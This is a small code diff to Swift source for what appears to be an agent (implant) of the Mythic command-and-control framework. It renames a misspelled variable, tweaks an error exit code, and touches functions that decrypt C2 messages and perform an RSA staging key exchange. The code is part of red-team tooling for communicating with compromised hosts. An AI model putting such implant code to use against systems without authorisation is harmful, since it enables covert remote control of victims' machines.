@@ -26,12 +26,12 @@ func generateIV() -> Data {
 func decryptMythicMessage(mythicMessage: String, key: Data, iv: Data ) -> String {
     // Decode Mythic response
     let decodedmythicMessage = fromBase64(data: mythicMessage)
-    
+
     // Check returned payloadUUID is the same
     let returnedPayloadUUID = decodedmythicMessage.subdata(in: 0..<36)
     if (returnedPayloadUUID != Data(agentConfig.payloadUUID.utf8)) {
         print("Error: PayloadUUID verification failed.")
-        exit(0)
+        exit(-1)
     }
     
     // Parse remaining AES blob: IV (16 bytes), Ciphertext (X bytes), HMAC (32 bytes)
@@ -63,7 +63,7 @@ func decryptMythicMessage(mythicMessage: String, key: Data, iv: Data ) -> String
 func encryptedKeyExchange() -> Bool {
     // Generate RSA keys
     let (privateKey, publicKey) = try! CC.RSA.generateKeyPair(4096)
-    let encoededPublicKey = toBase64(data: publicKey)
+    let encodedPublicKey = toBase64(data: publicKey)
     let sessionID = generateSessionID(length: 20)
     let decodedAESKey = Data(base64Encoded: agentConfig.encodedAESKey)!
     let payloadUUID = Data(agentConfig.payloadUUID.utf8)
@@ -71,7 +71,7 @@ func encryptedKeyExchange() -> Bool {
     // Create JSON payload
     var jsonPayload = JSON([
         "action": "staging_rsa",
-        "pub_key": encoededPublicKey,
+        "pub_key": encodedPublicKey,
         "session_id": sessionID,
     ])
     
